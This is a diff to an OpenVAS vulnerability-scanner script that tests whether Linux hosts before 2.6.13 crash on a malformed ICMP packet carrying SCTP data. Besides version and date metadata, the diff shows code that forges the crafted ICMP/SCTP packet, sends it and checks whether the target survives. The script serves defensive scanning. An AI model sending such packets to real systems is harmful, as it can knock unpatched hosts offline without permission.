@@ -1,5 +1,5 @@
 # OpenVAS Vulnerability Test
-# $Id: linux_icmp_sctp_DoS.nasl 6315 2017-06-12 10:34:26Z cfischer $
+# $Id: linux_icmp_sctp_DoS.nasl 7146 2017-09-15 12:38:49Z cfischer $
 # Description: Malformed ICMP Packets May Cause a Denial of Service (SCTP)
 #
 # Authors:
@@ -43,8 +43,8 @@ tag_solution = "Ugprade to Linux 2.6.13 or newer, or disable SCTP support.";
 if(description)
 {
  script_id(19777);
- script_version("$Revision: 6315 $");
- script_tag(name:"last_modification", value:"$Date: 2017-06-12 12:34:26 +0200 (Mon, 12 Jun 2017) $");
+ script_version("$Revision: 7146 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-09-15 14:38:49 +0200 (Fri, 15 Sep 2017) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:C/A:N");
@@ -82,7 +82,7 @@ ip2 = forge_ip_packet(ip_v:4, ip_hl:5, ip_tos:0, ip_off: 0,
 	     	        ip_src:this_host(), 
 			data: '\x28\x00\x00\x50\x00\x00\x00\x00\xf9\x57\x1F\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00');
 icmp = forge_icmp_packet(ip:ip, icmp_type: 3, icmp_code:2,
-	     		  icmp_seq: seq, icmp_id:seq, data: ip2);
+	     		  icmp_seq: 0, icmp_id: 0, data: ip2);
 send_packet(icmp, pcap_active: 0);
 
 alive = end_denial();
